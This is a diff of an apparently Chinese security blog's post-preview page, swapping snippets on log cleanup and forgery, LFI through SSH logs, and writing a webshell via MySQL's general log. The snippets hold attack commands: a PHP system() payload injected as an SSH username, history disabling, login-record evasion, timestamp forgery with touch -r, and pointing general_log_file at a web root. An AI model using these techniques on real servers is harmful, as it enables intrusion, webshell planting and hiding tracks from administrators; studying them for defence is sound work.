@@ -221,8 +221,11 @@
 日志清理与伪造
 
 Linux平台
-主要日志如下:
-12345678910111213141516171819202122232425262728293031323334353637383940unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE......
+无w与who记录登录：
+ssh -T root@172.16.50.166 &quot;/bin/bash -i&quot;
+挂载一个内存目录，重启消失，用于存放临时文件。mount -t ramfs ramfs /usr/tmp
+系统本来就存在这样的目录/dev/shm这个文件绝对777权限
+复制文件时间：touch -r /usr/sbin/sshd ......
         </div>
     </a>
     
@@ -570,19 +573,17 @@ author:rootclay@syclover
 
 <div class="post-preview">
 
-    <a href="/2017/03/23/lfi_ssh/">
+    <a href="/2017/03/23/mysql日志包含拿shell/">
         <h2 class="post-title">
-            LFI SSH日志
+            SQL语句利用日志写shell
         </h2>
         <h3 class="post-subtitle">
-            通过LFI包含到SSH日志来获取SHELL.
+            前不久刚出的SQL之间利用日志获取SHELL的姿势.
         </h3>
         <div class="post-content-preview">
-            LFI SSH日志
-1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
-1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
-Tips:
-123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
+            outfile被禁止，或者写入文件被拦截
+
+1234show variables like '%general%';  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址select '&lt;?php......
         </div>
     </a>
     
@@ -594,9 +595,7 @@ Tips:
             
               <a href="/tags/#Web" title="Web">Web</a>
             
-              <a href="/tags/#SSH" title="SSH">SSH</a>
-            
-              <a href="/tags/#LFI" title="LFI">LFI</a>
+              <a href="/tags/#SQL" title="SQL">SQL</a>
             
         </div>
     
